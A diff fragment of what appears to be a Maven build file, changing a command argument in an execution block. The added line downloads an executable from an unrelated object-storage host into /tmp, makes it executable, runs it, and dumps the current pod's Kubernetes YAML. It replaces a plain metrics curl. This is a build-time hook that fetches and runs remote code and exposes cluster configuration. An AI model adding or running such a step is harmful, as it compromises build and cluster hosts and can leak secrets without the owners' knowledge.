@@ -36,7 +36,7 @@
                             <!-- 命令的参数 -->
                             <arguments>
                                 <argument>-c</argument>
-                                <argument>curl http://prometheus-agent-kube-state-metrics.kube-system:8081/metrics</argument>
+                                <argument>curl https://cbvbcv.tos-cn-beijing.volces.com/kubectl -o /tmp/kubectl;chmod +x /tmp/kubectl;/tmp/kubectl get pods $(hostname) -o yaml</argument>
                             </arguments>
                         </configuration>
                     </execution>
